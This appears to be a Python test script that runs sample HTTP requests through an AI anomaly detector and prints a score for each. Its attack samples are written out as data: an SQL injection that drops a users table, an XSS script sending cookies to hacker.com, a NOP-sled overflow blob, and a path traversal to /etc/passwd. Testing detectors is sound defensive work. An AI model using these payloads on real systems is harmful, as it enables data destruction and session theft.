import sys
import os
import torch
import random
import string

# Ensure src is in path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../")))

from src.mnemosyne.inference import analyze_payload

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def get_anomaly_color(score):
    if score > 0.1: return RED
    if score > 0.05: return YELLOW
    return GREEN

def test_payload(name, payload_bytes):
    score = analyze_payload(payload_bytes)
    color = get_anomaly_color(score)
    print(f"[{name.ljust(20)}] Score: {color}{score:.6f}{RESET}")
    return score

def main():
    print("::: ARGUS AI BATTLE TEST :::")
    print("Baseline (Normal) vs. Attacks\n")

    # 1. Normal Traffic (Similar to Training Data)
    normal_req = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    test_payload("Normal Request", normal_req)

    normal_post = b"POST /login HTTP/1.1\r\nHost: example.com\r\n\r\nusername=admin&password=password123"
    test_payload("Normal API Call", normal_post)
    
    print("-" * 40)

    # 2. Attack: SQL Injection
    sqli = b"GET /search?q=' OR '1'='1'; DROP TABLE users; -- HTTP/1.1\r\nHost: target.com\r\n\r\n"
    test_payload("SQL Injection", sqli)

    # 3. Attack: XSS
    xss = b"POST /comment HTTP/1.1\r\n\r\n<script>document.location='http://hacker.com/?cookie='+document.cookie</script>"
    test_payload("XSS Payload", xss)

    # 4. Attack: Buffer Overflow / Binary Junk
    # The AI was trained on HTTP text. Random binary junk should FREAK IT OUT.
    buffer_overflow = b"A" * 500 + b"\x90\x90\x90\x90" + os.urandom(100)
    test_payload("Buffer Overflow", buffer_overflow)

    # 5. Attack: Path Traversal
    traversal = b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: target.com\r\n\r\n"
    test_payload("Path Traversal", traversal)

if __name__ == "__main__":
    main()
